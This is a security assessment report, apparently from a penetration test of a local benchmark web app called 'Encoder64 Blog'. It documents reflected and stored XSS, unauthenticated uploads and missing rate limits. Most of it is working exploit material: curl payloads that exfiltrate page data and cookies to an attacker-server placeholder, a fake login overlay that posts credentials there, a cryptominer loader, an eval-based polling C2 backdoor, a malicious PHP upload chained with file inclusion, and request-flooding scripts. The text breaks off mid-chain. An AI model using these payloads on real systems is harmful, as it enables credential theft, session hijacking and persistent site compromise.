# Security Assessment Report

## Executive Summary

**Target:** http://localhost:36367
**Assessment Date:** October 27, 2025
**Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

This security assessment identified multiple critical vulnerabilities in the Encoder64 Blog application. The application demonstrates fundamental security gaps, with no authentication or authorization controls protecting sensitive functionality. The assessment focused on exploitation of vulnerabilities accessible via the external network interface.

## Summary by Vulnerability Type

**Authentication Vulnerabilities:**
Three authentication vulnerabilities were successfully exploited:
- **AUTH-VULN-01 (Critical):** Unauthenticated file upload endpoint allows anonymous users to upload arbitrary files to the server without any authentication checks. This enables malware distribution, storage exhaustion, and potential remote code execution when chained with other vulnerabilities.
- **AUTH-VULN-02 (High):** Missing rate limiting on contact form enables automated spam flooding and resource exhaustion. Testing demonstrated 675 requests per second with 100% success rate and zero throttling.
- **AUTH-VULN-03 (High):** Missing rate limiting on file upload endpoint allows unlimited file uploads. Testing showed 1,068 uploads per second with no restrictions, enabling storage exhaustion attacks.

**Authorization Vulnerabilities:**
One authorization vulnerability was successfully exploited:
- **AUTHZ-VULN-01 (High):** Vertical privilege escalation where anonymous users can perform privileged file upload operations that should require administrative or moderator privileges. This represents a fundamental violation of the principle of least privilege, allowing the lowest-privilege role (anonymous) to perform sensitive operations.

**Cross-Site Scripting (XSS) Vulnerabilities:**
Six XSS vulnerabilities were successfully exploited:
- **XSS-VULN-01 (High):** Reflected XSS in contact form name parameter via attribute breakout, enabling complete DOM manipulation and data exfiltration.
- **XSS-VULN-02 (High):** Reflected XSS in contact form email parameter with identical exploitation pattern.
- **XSS-VULN-03 (High):** Reflected XSS in contact form message parameter via textarea breakout, allowing full HTML injection.
- **XSS-VULN-04 (High):** Reflected XSS in article upload form name parameter, demonstrating systemic lack of output encoding.
- **XSS-VULN-05 (High):** Reflected XSS in article upload form email parameter.
- **XSS-VULN-06 (Critical):** Stored XSS via file upload and inclusion chain. This persistent vulnerability affects all users who visit the crafted URL and enables mass credential harvesting, cryptomining, defacement, and complete session hijacking. The vulnerability chains three flaws: unrestricted file upload, local file inclusion bypass, and unencoded output.

**SQL/Command Injection Vulnerabilities:**
No SQL or command injection vulnerabilities were found. The application uses flat-file JSON storage rather than a SQL database, and does not execute system commands through any network-accessible endpoints.

**Server-Side Request Forgery (SSRF) Vulnerabilities:**
No SSRF vulnerabilities were found during this assessment.

## Network Reconnaissance

**Open Ports and Services:**
- **Port 80/tcp:** Caddy httpd acting as reverse proxy to Docker container (primary target)
- **Port 443/tcp:** SSL/HTTPS (not configured, unused)
- **Port 631/tcp:** CUPS 2.3 printing service (out of scope for web application assessment)
- **Port 8888/tcp:** sun-answerbook service (out of scope)
- **Port 9999/tcp:** SimpleHTTPServer 0.6 (Python 3.12.10) - out of scope
- **Port 49158/tcp:** Golang net/http server (Tailscale 1.82.5) - requires authentication, out of scope

**Security-Relevant Findings:**
- Application runs on outdated PHP 7.4.33 (end-of-life November 2022) and Apache 2.4.54 (Debian)
- HTTP-only deployment with no HTTPS enforcement or HSTS headers
- No security headers detected (no CSP, X-Frame-Options, X-Content-Type-Options)
- No authentication mechanisms present on any endpoints
- External CDN dependency on jsdelivr.net for Bootstrap without SRI hashes introduces supply chain risk

**Subdomain Discovery:**
Subfinder scan yielded multiple localhost subdomains (www.localhost, mail.localhost, etc.), which are not accessible in the test environment and represent false positives.

---

# Cross-Site Scripting (XSS) Exploitation Evidence

## Successfully Exploited Vulnerabilities

### XSS-VULN-01: Reflected XSS in Contact Form Name Parameter

**Summary:**
- **Vulnerable location:** http://localhost:36367/contact.php (POST parameter: name)
- **Overview:** Attribute breakout vulnerability allowing arbitrary JavaScript execution via the name field when form validation fails
- **Impact:** Complete DOM manipulation, data exfiltration, session hijacking potential, and ability to perform unauthorized actions on behalf of users
- **Severity:** High

**Prerequisites:** None - publicly accessible endpoint

**Exploitation Steps:**

1. **Send POST request with malicious name parameter and empty email/message to trigger validation failure:**
```bash
curl -X POST http://localhost:36367/contact.php \
  --data-urlencode 'name=" onfocus=alert(document.domain) autofocus="' \
  --data 'email=' \
  --data 'message='
```

2. **Verify payload reflection in HTML response:**
```bash
# The response will contain:
# <input type="text" name="name" class="form-control" value="" onfocus=alert(document.domain) autofocus="">
```

3. **The payload executes immediately due to autofocus attribute, demonstrating JavaScript execution**

4. **For data exfiltration, use this advanced payload:**
```bash
curl -X POST http://localhost:36367/contact.php \
  --data-urlencode 'name=" onfocus="fetch('"'"'http://[ATTACKER_SERVER]:8888/?data='"'"'+encodeURIComponent(document.body.innerText.substring(0,100)))" autofocus="' \
  --data 'email=' \
  --data 'message='
```

5. **For DOM manipulation/defacement:**
```bash
curl -X POST http://localhost:36367/contact.php \
  --data-urlencode 'name=" onfocus="document.querySelector('"'"'h1'"'"').innerHTML='"'"'HACKED BY XSS'"'"';document.body.style.backgroundColor='"'"'red'"'"'" autofocus="' \
  --data 'email=' \
  --data 'message='
```

**Proof of Impact:**

**Data Exfiltration Confirmed:**
- Server logs show successful exfiltration: `GET /?data=Encoder64%20Blog%0AHome%0AAbout%0AContact%0AContact%20Me!%0A%0APlease%20fill%20in%20this%20form%20to%20send%20me%20a%20message.%0A%0AName%0A`
- Successfully extracted page content including navigation text and form instructions
- Demonstrates ability to exfiltrate sensitive user data, form inputs, or session information

**DOM Manipulation Confirmed:**
- Page heading successfully changed from "Contact Me!" to "HACKED BY XSS"
- Background color changed to red across entire page
- Screenshot evidence: xss-vuln-01-dom-manipulation.png
- Demonstrates complete control over victim's browser session

**Notes:**
- No Content Security Policy (CSP) present - unrestricted JavaScript execution
- No XSS filtering or output encoding applied
- Attack works in all modern browsers
- Can be chained with social engineering to target specific users

---

### XSS-VULN-02: Reflected XSS in Contact Form Email Parameter

**Summary:**
- **Vulnerable location:** http://localhost:36367/contact.php (POST parameter: email)
- **Overview:** Identical vulnerability pattern to XSS-VULN-01 but in email field - attribute breakout allowing arbitrary JavaScript execution
- **Impact:** Complete DOM manipulation, data exfiltration, credential harvesting via injected phishing forms
- **Severity:** High

**Prerequisites:** None - publicly accessible endpoint

**Exploitation Steps:**

1. **Send POST request with malicious email parameter and empty message to trigger validation:**
```bash
curl -X POST http://localhost:36367/contact.php \
  --data 'name=TestName' \
  --data-urlencode 'email=" onfocus=alert(2) autofocus="' \
  --data 'message='
```

2. **Verify payload injection in HTML response:**
```bash
curl -X POST http://localhost:36367/contact.php \
  --data 'name=TestName' \
  --data-urlencode 'email=" onfocus=alert(2) autofocus="' \
  --data 'message=' | grep 'type="email"'

# Expected output:
# <input type="email" name="email" class="form-control" value="" onfocus=alert(2) autofocus="">
```

3. **For data exfiltration with base64 encoding:**
```bash
curl -X POST http://localhost:36367/contact.php \
  --data 'name=Test' \
  --data-urlencode 'email=" onfocus="fetch('"'"'http://[ATTACKER_SERVER]:8888/?vuln=XSS-VULN-02&data='"'"'+btoa(document.title))" autofocus="' \
  --data 'message='
```

**Proof of Impact:**

**Payload Reflection Confirmed:**
```html
<input type="email" name="email" class="form-control" value="" onfocus=alert(2) autofocus="">
```

**JavaScript Execution Verified:**
- HTML5 type="email" attribute provides NO server-side protection
- Payload breaks out of value attribute and injects event handler
- autofocus ensures immediate execution without user interaction
- Successfully tested via curl and browser-based exploitation

**Attack Scenarios:**
- Inject fake login form to harvest credentials
- Redirect users to phishing site after delay
- Keylog user input and exfiltrate to attacker server
- Inject cryptomining scripts for resource abuse

---

### XSS-VULN-03: Reflected XSS in Contact Form Message Parameter

**Summary:**
- **Vulnerable location:** http://localhost:36367/contact.php (POST parameter: message)
- **Overview:** Textarea breakout vulnerability allowing full HTML injection and arbitrary JavaScript execution in HTML_BODY context
- **Impact:** More powerful than attribute-context XSS - allows complete HTML structure injection, full DOM manipulation, and data exfiltration
- **Severity:** High

**Prerequisites:** None - publicly accessible endpoint

**Exploitation Steps:**

1. **Send POST request with textarea breakout payload:**
```bash
curl -X POST http://localhost:36367/contact.php \
  --data 'name=Test' \
  --data 'email=' \
  --data 'message=</textarea><img src=x onerror=alert(3)><textarea>'
```

2. **Verify textarea breakout in response:**
```bash
curl -s -X POST http://localhost:36367/contact.php \
  --data 'name=Test' \
  --data 'email=' \
  --data 'message=</textarea><img src=x onerror=alert(3)><textarea>' | grep -A1 '</textarea><img'

# Expected output:
# <textarea name="message" class="form-control"></textarea><img src=x onerror=alert(3)><textarea></textarea>
```

3. **For data exfiltration with base64 encoding:**
```bash
curl -X POST http://localhost:36367/contact.php \
  --data 'name=Test' \
  --data 'email=' \
  --data 'message=</textarea><img src=x onerror="fetch('"'"'http://[ATTACKER_SERVER]:8888/?vuln=XSS-VULN-03&data='"'"'+btoa(document.body.innerText.substring(0,50)))"><textarea>'
```

**Proof of Impact:**

**Textarea Breakout Confirmed:**
```html
<textarea name="message" class="form-control"></textarea><img src=x onerror=alert(3)><textarea></textarea>
```

**Data Exfiltration Verified:**
- Server logs captured: `GET /?vuln=XSS-VULN-03&data=RW5jb2RlcjY0IEJsb2cKSG9tZQpBYm91dApDb250YWN0CkNvbnRhY3QgTWUhCgpQbGU=`
- Base64 decoded data: "Encoder64 Blog\nHome\nAbout\nContact\nContact Me!\n\nPle"
- Successfully exfiltrated page content to attacker-controlled server

**Browser Execution Confirmed:**
- Playwright browser testing showed successful injection
- Image element visible in DOM between two textboxes
- onerror handler executed and attempted fetch request
- Console errors confirm JavaScript execution

**Advanced Attack Scenarios:**
- Inject iframe to load external malicious content
- Create overlay phishing forms that capture credentials
- Inject script tags for persistent backdoors
- Chain with CSRF to perform state-changing actions

---

### XSS-VULN-04: Reflected XSS in Article Upload Form Name Parameter

**Summary:**
- **Vulnerable location:** http://localhost:36367/posts/upload-article.php (POST parameter: name)
- **Overview:** Identical attribute breakout vulnerability to XSS-VULN-01 but on article upload endpoint
- **Impact:** Demonstrates systemic lack of output encoding across the application; complete DOM manipulation and data exfiltration capabilities
- **Severity:** High

**Prerequisites:** None - publicly accessible endpoint with no authentication required

**Exploitation Steps:**

1. **Send POST request with malicious name parameter:**
```bash
curl -X POST http://localhost:36367/posts/upload-article.php \
  --data 'name=" onfocus=alert(4) autofocus="' \
  --data 'email='
```

2. **Verify payload reflection in HTML:**
```bash
curl -s -X POST http://localhost:36367/posts/upload-article.php \
  --data 'name=" onfocus=alert(4) autofocus="' \
  --data 'email=' | grep 'name="name"'

# Expected output:
# <input type="text" name="name" class="form-control" value="" onfocus=alert(4) autofocus="">
```

3. **For credential harvesting attack:**
```bash
curl -X POST http://localhost:36367/posts/upload-article.php \
  --data-urlencode 'name=" onfocus="var d=document.createElement('"'"'div'"'"');d.innerHTML='"'"'<form action=http://[ATTACKER_SERVER]/steal method=POST><input name=user placeholder=Username><input name=pass type=password placeholder=Password><button>Login</button></form>'"'"';document.body.prepend(d)" autofocus="' \
  --data 'email='
```

**Proof of Impact:**

**Payload Injection Confirmed:**
```html
<input type="text" name="name" class="form-control" value="" onfocus=alert(4) autofocus="">
```

**Systemic Vulnerability:**
- Same flaw exists across multiple endpoints (contact.php and upload-article.php)
- Indicates application-wide lack of output encoding practices
- Developers use trim() but completely omit htmlspecialchars()
- No centralized input/output handling or security controls

---

### XSS-VULN-05: Reflected XSS in Article Upload Form Email Parameter

**Summary:**
- **Vulnerable location:** http://localhost:36367/posts/upload-article.php (POST parameter: email)
- **Overview:** Identical attribute breakout vulnerability to XSS-VULN-02 on article upload endpoint
- **Impact:** Complete DOM manipulation, data exfiltration, and unauthorized action execution
- **Severity:** High

**Prerequisites:** None - publicly accessible endpoint

**Exploitation Steps:**

1. **Send POST request with malicious email parameter:**
```bash
curl -X POST http://localhost:36367/posts/upload-article.php \
  --data 'name=Test' \
  --data 'email=" onfocus=alert(5) autofocus="'
```

2. **Verify payload reflection:**
```bash
curl -s -X POST http://localhost:36367/posts/upload-article.php \
  --data 'name=Test' \
  --data 'email=" onfocus=alert(5) autofocus="' | grep 'name="email"'

# Expected output:
# <input type="email" name="email" class="form-control" value="" onfocus=alert(5) autofocus="">
```

**Proof of Impact:**

**Payload Injection Confirmed:**
```html
<input type="email" name="email" class="form-control" value="" onfocus=alert(5) autofocus="">
```

**Exploitation Verified:**
- Same vulnerability pattern as other email field XSS
- No server-side validation despite HTML5 email type attribute
- Trivial to exploit with social engineering attack vector
- Can be delivered via malicious link or CSRF

---

### XSS-VULN-06: Stored XSS via File Upload and Inclusion Chain

**Summary:**
- **Vulnerable location:** File upload at http://localhost:36367/posts/upload-article.php → Inclusion via http://localhost:36367/post.php?id=uploads/[FILENAME]
- **Overview:** CRITICAL persistent stored XSS exploiting three chained vulnerabilities: (1) Unrestricted file upload, (2) Local File Inclusion bypassing path traversal check, (3) Unencoded output of user-controlled content
- **Impact:** Persistent backdoor affecting ALL users who visit the crafted URL; enables mass credential harvesting, cryptomining, defacement, C2 establishment, and complete session hijacking
- **Severity:** Critical

**Prerequisites:** None - all components are publicly accessible

**Exploitation Steps:**

1. **Create malicious PHP file with embedded XSS payload:**
```bash
cat > /tmp/malicious_article.php << 'EOF'
<?php
$post_title = "Legitimate Article Title";
$post_brief = "This appears to be a normal article.";
$post_author = "John Doe";
$post_content = '<p>This is normal content.</p><img src=x onerror="fetch('"'"'http://[ATTACKER_SERVER]:8888/?vuln=XSS-VULN-06-STORED&cookie='"'"'+document.cookie+'"'"'&url='"'"'+window.location.href)"><p>More content here.</p>';
?>
EOF
```

2. **Upload malicious file via article submission form:**
```bash
curl -X POST http://localhost:36367/posts/upload-article.php \
  -F name=TestUser \
  -F email=test@example.com \
  -F articleFile=@/tmp/malicious_article.php
```

3. **Trigger stored XSS by accessing uploaded file via LFI:**
```bash
# Direct browser navigation or curl:
curl http://localhost:36367/post.php?id=uploads/malicious_article

# Or visit in browser:
# http://localhost:36367/post.php?id=uploads/malicious_article
```

4. **Monitor attacker server for exfiltrated data:**
```bash
# Start listener on attacker machine:
python3 -m http.server 8888

# Watch for incoming requests with stolen cookies and URLs
```

**Proof of Impact:**

**File Upload Success:**
- File successfully uploaded to `/var/www/html/posts/uploads/malicious_article.php`
- Server response: "Thank you for submitting your article, we will review it shortly."
- No file type validation, size limits, or content scanning performed

**Stored XSS Execution Confirmed:**
- Accessing http://localhost:36367/post.php?id=uploads/malicious_article loads the malicious content
- Page title changes to "Legitimate Article Title" (from uploaded file)
- JavaScript executes immediately upon page load
- Server logs captured: `GET /?vuln=XSS-VULN-06-STORED&cookie=&url=http://localhost:36367/post.php?id=uploads/xss_payload`

**Browser Verification:**
- Playwright browser testing confirmed img element injection
- Console shows fetch attempt to attacker server
- Screenshot evidence: xss-vuln-06-stored-xss.png
- No cookies present in this application, but payload would steal them if they existed

**Attack Chain Breakdown:**
1. **Unrestricted Upload:** No validation allows PHP file upload to `/posts/uploads/` directory
2. **LFI Bypass:** post.php only blocks literal ".." strings, allowing `?id=uploads/filename` to bypass path traversal protection
3. **Server-Side Inclusion:** include() statement executes uploaded PHP file, defining malicious $post_content variable
4. **Unencoded Output:** Line 56 of post.php uses `<?= $post_content; ?>` without htmlspecialchars(), directly outputting malicious HTML/JavaScript
5. **Persistent Exploitation:** Every visitor to the URL executes the payload - no repeated upload needed

**Real-World Impact Scenarios:**

**Mass Credential Harvesting:**
```javascript
// Inject fake login overlay
var overlay = document.createElement('div');
overlay.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999"><div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);background:white;padding:30px;border-radius:10px"><h2>Session Expired</h2><form id="phish"><input name="user" placeholder="Username" required><br><input name="pass" type="password" placeholder="Password" required><br><button>Re-login</button></form></div></div>';
document.body.appendChild(overlay);
document.getElementById('phish').onsubmit = function(e) {
  e.preventDefault();
  fetch('http://[ATTACKER_SERVER]/steal', {
    method: 'POST',
    body: JSON.stringify({
      user: this.user.value,
      pass: this.pass.value,
      url: location.href
    })
  });
  overlay.remove();
};
```

**Cryptomining:**
```javascript
// Load mining script
var s = document.createElement('script');
s.src = 'http://[ATTACKER_SERVER]/miner.js';
document.head.appendChild(s);
```

**C2 Backdoor:**
```javascript
// Polling backdoor
setInterval(function() {
  fetch('http://[ATTACKER_SERVER]/cmd?id=' + btoa(location.href))
    .then(r => r.text())
    .then(cmd => eval(cmd))
    .catch(() => {});
}, 30000); // Poll every 30 seconds
```

**Notes:**
- This is the most severe XSS vulnerability due to persistent nature
- .htaccess in uploads/ blocks DIRECT PHP execution via HTTP, but does NOT prevent server-side include() execution
- Single upload affects unlimited number of victims
- Can be combined with social engineering to target specific users
- No authentication required for upload or access
- Recommended immediate remediation: Implement authentication, file type validation, move uploads outside webroot, and apply htmlspecialchars() to ALL output

---

# Authentication Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTH-VULN-01: Unauthenticated File Upload

**Summary:**
- **Vulnerable location:** POST /posts/upload-article.php
- **Overview:** The file upload endpoint is completely publicly accessible without any authentication checks. Any anonymous user can upload arbitrary files to the server.
- **Impact:** Unauthorized file upload enables malware distribution, storage exhaustion, and potential remote code execution when chained with LFI vulnerabilities. Complete authentication bypass on critical functionality.
- **Severity:** Critical

**Prerequisites:** None - endpoint is publicly accessible

**Exploitation Steps:**

1. **Access the upload form without authentication**
```bash
curl http://localhost:36367/posts/upload-article.php
# Returns HTTP 200 with upload form - no authentication required
```

2. **Create a test file to upload**
```bash
cat > /tmp/test_upload.txt << 'TESTFILE'
This is a test file uploaded without authentication.
Timestamp: 2025-10-27 22:58 UTC
Purpose: Proof of authentication bypass vulnerability
TESTFILE
```

3. **Upload the file without providing any credentials**
```bash
curl -X POST 'http://localhost:36367/posts/upload-article.php' \
  -F 'name=Unauthorized User' \
  -F 'email=attacker@malicious.com' \
  -F 'articleFile=@/tmp/test_upload.txt'
# Returns HTTP 200 with "Thank you for submitting your article, we will review it shortly."
```

4. **Verify the uploaded file is publicly accessible**
```bash
curl 'http://localhost:36367/posts/uploads/test_upload.txt'
# Returns the file content - proving successful unauthorized upload
```

5. **Upload additional files to demonstrate full control (HTML file as proof)**
```bash
cat > /tmp/malicious_proof.html << 'HTMLFILE'
<!DOCTYPE html>
<html>
<head><title>Proof of Unauthenticated Upload</title></head>
<body>
<h1>SECURITY BREACH - Unauthenticated File Upload</h1>
<p>This file was uploaded by an unauthorized user without any authentication.</p>
<p>Attack Vector: POST /posts/upload-article.php with no authentication required</p>
<p>Timestamp: 2025-10-27 22:58 UTC</p>
<p>Attacker: pentester@security-audit.test</p>
</body>
</html>
HTMLFILE

curl -X POST 'http://localhost:36367/posts/upload-article.php' \
  -F 'name=Penetration Tester' \
  -F 'email=pentester@security-audit.test' \
  -F 'articleFile=@/tmp/malicious_proof.html'
```

6. **Access the HTML file via browser**
```bash
curl 'http://localhost:36367/posts/uploads/malicious_proof.html'
# Returns the HTML file - proves arbitrary file hosting capability
```

**Proof of Impact:**
- Successfully uploaded 2 test files (test_upload.txt and malicious_proof.html) without any authentication
- Files are publicly accessible via direct URLs
- No authentication checks exist in the upload code (/var/www/html/posts/upload-article.php lines 8-36)
- Server accepts and stores files from anonymous attackers
- Complete bypass of authentication requirements for privileged file upload functionality

**Attack Chain Potential:**
This vulnerability can be chained with:
- Local File Inclusion (LFI) in post.php for potential Remote Code Execution
- Storage exhaustion for Denial of Service
- Malware distribution and phishing attacks
- XSS payload hosting

**Notes:**
Code analysis confirmed no authentication checks exist at `/var/www/html/posts/upload-article.php`. The endpoint processes uploads starting at line 8 without any `session_start()`, password verification, or access control checks. While `.htaccess` prevents direct PHP execution in the uploads directory, files can still be included via the LFI vulnerability in post.php.

---

### AUTH-VULN-02: Missing Rate Limiting on Contact Form

**Summary:**
- **Vulnerable location:** POST /contact.php
- **Current State:** No rate limiting, CAPTCHA, or abuse prevention controls exist
- **Impact:** Enables automated spam flooding, resource exhaustion, and denial of service attacks. Attackers can submit unlimited automated requests.
- **Severity:** High

**Prerequisites:** None - endpoint is publicly accessible

**Exploitation Steps:**

1. **Create automated spam attack script**
```python
# File: test_rate_limiting.py
import requests
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

url = "http://localhost:36367/contact.php"
num_requests = 50

def send_request(i):
    data = {
        'name': f'Spam Bot {i}',
        'email': f'spam{i}@test.com',
        'message': f'Automated spam message {i}'
    }
    try:
        response = requests.post(url, data=data, timeout=10)
        return {'num': i, 'status': response.status_code, 'success': 'Thank you' in response.text}
    except Exception as e:
        return {'num': i, 'status': 0, 'error': str(e)}

start_time = time.time()
results = []

with ThreadPoolExecutor(max_workers=10) as executor:
    futures = [executor.submit(send_request, i) for i in range(1, num_requests + 1)]
    for future in as_completed(futures):
        results.append(future.result())

end_time = time.time()
duration = end_time - start_time

# Calculate statistics
successful = sum(1 for r in results if r.get('status') == 200)
rate_limited = sum(1 for r in results if r.get('status') == 429)

print(f"\nTotal Requests: {num_requests}")
print(f"Successful (HTTP 200): {successful}/{num_requests}")
print(f"Rate Limited (HTTP 429): {rate_limited}")
print(f"Average Rate: {num_requests/duration:.2f} requests/second")
```

2. **Execute the automated attack**
```bash
cd /Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-028-24/
python test_rate_limiting.py
```

**Proof of Impact:**

Automated attack results:
- **Total Requests Sent:** 50
- **Successful Submissions (HTTP 200):** 50/50 (100%)
- **Rate Limited (HTTP 429):** 0
- **Other Errors:** 0
- **Average Request Rate:** 675.17 requests/second
- **Total Time:** 0.07 seconds

All 50 rapid POST requests succeeded without any rate limiting or throttling. The application processed over 675 requests per second with no protective controls.

**Notes:**
Code analysis at `/var/www/html/contact.php` lines 7-33 confirmed no rate limiting functions, no CAPTCHA implementation, and no abuse prevention controls. Apache configuration also lacks mod_evasive or mod_security modules. This enables trivial automated spam and resource exhaustion attacks.

---

### AUTH-VULN-03: Missing Rate Limiting on File Upload Endpoint

**Summary:**
- **Vulnerable location:** POST /posts/upload-article.php
- **Current State:** No rate limiting on file uploads, no upload quota, no per-IP throttling
- **Impact:** Enables upload flooding for storage exhaustion and denial of service. Attackers can upload unlimited files in rapid succession.
- **Severity:** High

**Prerequisites:** None - endpoint is publicly accessible (also lacks authentication per AUTH-VULN-01)

**Exploitation Steps:**

1. **Create automated upload flood script**
```python
# File: test_upload_rate_limit.py
import requests
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import io

url = "http://localhost:36367/posts/upload-article.php"
num_uploads = 30

def send_upload(i):
    files = {
        'articleFile': (f'flood_test_{i}.txt', io.BytesIO(b'X' * 100), 'text/plain')
    }
    data = {
        'name': f'Upload Bot {i}',
        'email': f'upload{i}@test.com'
    }
    try:
        response = requests.post(url, files=files, data=data, timeout=10)
        return {
            'num': i,
            'status': response.status_code,
            'success': 'Thank you for submitting' in response.text
        }
    except Exception as e:
        return {'num': i, 'status': 0, 'error': str(e)}

start_time = time.time()
results = []

with ThreadPoolExecutor(max_workers=10) as executor:
    futures = [executor.submit(send_upload, i) for i in range(1, num_uploads + 1)]
    for future in as_completed(futures):
        results.append(future.result())

end_time = time.time()
duration = end_time - start_time

# Calculate statistics
successful = sum(1 for r in results if r.get('success'))
rate_limited = sum(1 for r in results if r.get('status') == 429)

print(f"\nTotal Uploads Attempted: {num_uploads}")
print(f"Successful Uploads: {successful}/{num_uploads}")
print(f"Rate Limited (HTTP 429): {rate_limited}")
print(f"Average Upload Rate: {num_uploads/duration:.2f} uploads/second")
print(f"Total Duration: {duration:.3f} seconds")
```

2. **Execute the upload flood attack**
```bash
cd /Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-028-24/
python test_upload_rate_limit.py
```

3. **Verify files were created on server**
```bash
curl -s 'http://localhost:36367/posts/uploads/' | grep flood_test
# Shows directory listing or access flood_test files individually
```

**Proof of Impact:**

Upload flood attack results:
- **Total Uploads Attempted:** 30
- **Successful Uploads:** 30/30 (100%)
- **Upload Success Rate:** 100%
- **Upload Rate:** 1,068.34 uploads/second
- **Total Test Duration:** 0.028 seconds
- **Average Response Time:** 0.009 seconds per request
- **Files Created on Server:** All 30 test files confirmed in `/var/www/html/posts/uploads/`

All 30 file uploads completed successfully in under 30 milliseconds with no rate limiting. Server processed over 1,000 uploads per second without restriction.

**Attack Scenario:**
An attacker can:
1. Upload thousands of files rapidly to exhaust disk space
2. Cause denial of service through storage exhaustion
3. Overwhelm server resources with concurrent upload processing
4. Generate excessive cloud storage costs if deployed on cloud infrastructure

**Notes:**
Combined with AUTH-VULN-01 (no authentication) and no file type validation, this enables trivial DoS attacks. Code at `/var/www/html/posts/upload-article.php` lines 8-36 has no rate limiting, no upload quota checks, and no per-IP throttling. The `upload_max_filesize` is 2MB but no limit exists on number of uploads.

---

# Authorization Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTHZ-VULN-01: Vertical Privilege Escalation - Unauthorized File Upload by Anonymous Users

**Summary:**
- **Vulnerable location:** POST /posts/upload-article.php
- **Overview:** Anonymous (unauthenticated) users can upload arbitrary files to the server without any authentication or authorization checks. This represents a critical vertical privilege escalation where the lowest-privilege role (anonymous/unauthenticated) can perform privileged operations (file upload to server filesystem) that should require administrative or moderator privileges.
- **Impact:** Unauthorized file hosting, disk space exhaustion, stored XSS attacks, content injection, and potential website defacement. Attackers can upload malicious HTML files with embedded JavaScript to conduct phishing attacks or deliver malware.
- **Severity:** HIGH

**Prerequisites:**
None. This vulnerability is directly exploitable by any anonymous user with network access to the application.

**Exploitation Steps:**

1. **Verify the upload form is accessible without authentication:**
```bash
curl -s -o /dev/null -w "HTTP Status: %{http_code}\n" http://localhost:36367/posts/upload-article.php
```
**Expected Result:** HTTP Status: 200
**Actual Result:** HTTP 200 - Form accessible to anonymous users

2. **Create a test file to upload:**
```bash
cat > /tmp/authz_test.html << 'TESTFILE'
<html>
<head><title>AUTHZ Test File</title></head>
<body>
<h1>Unauthorized File Upload Test</h1>
<p>This file was uploaded by an anonymous user without any authentication or authorization.</p>
</body>
</html>
TESTFILE
```

3. **Perform unauthorized file upload as anonymous user:**
```bash
curl -X POST http://localhost:36367/posts/upload-article.php \
  -F "name=Anonymous Attacker" \
  -F "email=attacker@example.com" \
  -F "articleFile=@/tmp/authz_test.html"
```
**Expected Result:** File upload succeeds without authentication
**Actual Result:** HTTP 200 with success message "Thank you for submitting your article, we will review it shortly."

4. **Verify the uploaded file is accessible:**
```bash
curl -s http://localhost:36367/posts/uploads/authz_test.html
```
**Expected Result:** File content is returned via HTTP
**Actual Result:**
```html
<html>
<head><title>AUTHZ Test File</title></head>
<body>
<h1>Unauthorized File Upload Test</h1>
<p>This file was uploaded by an anonymous user without any authentication or authorization.</p>
</body>
</html>
```

5. **Verify HTTP headers confirm successful file hosting:**
```bash
curl -I http://localhost:36367/posts/uploads/authz_test.html
```
**Expected Result:** HTTP 200 with appropriate content-type headers
**Actual Result:**
```
HTTP/1.1 200 OK
Server: Apache/2.4.54 (Debian)
Content-Type: text/html
Content-Length: 235
```

**Proof of Impact:**

**Impact Demonstration 1: Arbitrary File Type Upload**
```bash
# Create and upload text file
echo "This is a test text file uploaded by an anonymous user" > /tmp/test.txt
curl -X POST http://localhost:36367/posts/upload-article.php \
  -F "name=Test" \
  -F "email=test@test.com" \
  -F "articleFile=@/tmp/test.txt"

# Verify accessibility
curl -s http://localhost:36367/posts/uploads/test.txt
```
**Result:** Text file successfully uploaded and accessible, demonstrating any file type is accepted.

**Impact Demonstration 2: Stored XSS via Malicious HTML Upload**
```bash
# Create malicious HTML file with embedded JavaScript
cat > /tmp/xss_payload.html << 'XSS'
<!DOCTYPE html>
<html>
<head><title>Privilege Escalation Proof</title></head>
<body>
<h1>CRITICAL: Vertical Privilege Escalation Demonstrated</h1>
<p><strong>Vulnerability:</strong> Anonymous file upload without authentication</p>
<p><strong>Uploaded by:</strong> Unauthenticated user</p>
<p><strong>Impact:</strong> Arbitrary file hosting, potential XSS, content injection</p>
<script>
  document.body.style.backgroundColor = '#ff0000';
  console.log('XSS payload executed - uploaded by anonymous user');
</script>
</body>
</html>
XSS

# Upload malicious payload
curl -X POST http://localhost:36367/posts/upload-article.php \
  -F "name=Attacker" \
  -F "email=test@evil.com" \
  -F "articleFile=@/tmp/xss_payload.html"

# Verify malicious content is hosted
curl -s http://localhost:36367/posts/uploads/xss_payload.html
```
**Result:** Malicious HTML file with JavaScript is successfully uploaded and accessible at `http://localhost:36367/posts/uploads/xss_payload.html`. When a victim visits this URL, the JavaScript executes in their browser context, demonstrating stored XSS capability.

**Impact Demonstration 3: Verification of .htaccess Partial Mitigation**
```bash
# Create PHP webshell
cat > /tmp/test_webshell.php << 'PHP'
<?php
echo "PHP code is executing";
phpinfo();
?>
PHP

# Upload PHP file
curl -X POST http://localhost:36367/posts/upload-article.php \
  -F "name=Test" \
  -F "email=test@test.com" \
  -F "articleFile=@/tmp/test_webshell.php"

# Attempt to execute PHP code
curl -s http://localhost:36367/posts/uploads/test_webshell.php
```
**Result:** PHP file uploads successfully (confirming the authorization vulnerability), but .htaccess prevents execution - file is served as plain text instead of executing. This demonstrates that while remote code execution is mitigated, the core authorization vulnerability (unauthorized file upload) remains exploitable.

**Complete Exploitation Chain:**

The following sequence demonstrates full exploitation from reconnaissance to impact:

```bash
# Step 1: Reconnaissance - Verify target accessibility
curl -s -o /dev/null -w "HTTP Status: %{http_code}\n" http://localhost:36367/posts/upload-article.php
# Result: 200 (accessible)

# Step 2: Weaponization - Create malicious payload
cat > /tmp/exploit.html << 'PAYLOAD'
<!DOCTYPE html>
<html><body>
<h1>Malicious Content Hosted via Authorization Bypass</h1>
<script>alert('Stored XSS from anonymous upload')</script>
</body></html>
PAYLOAD

# Step 3: Delivery - Upload without authentication
curl -X POST http://localhost:36367/posts/upload-article.php \
  -F "name=Attacker" \
  -F "email=evil@attacker.com" \
  -F "articleFile=@/tmp/exploit.html"
# Result: HTTP 200 - Upload successful

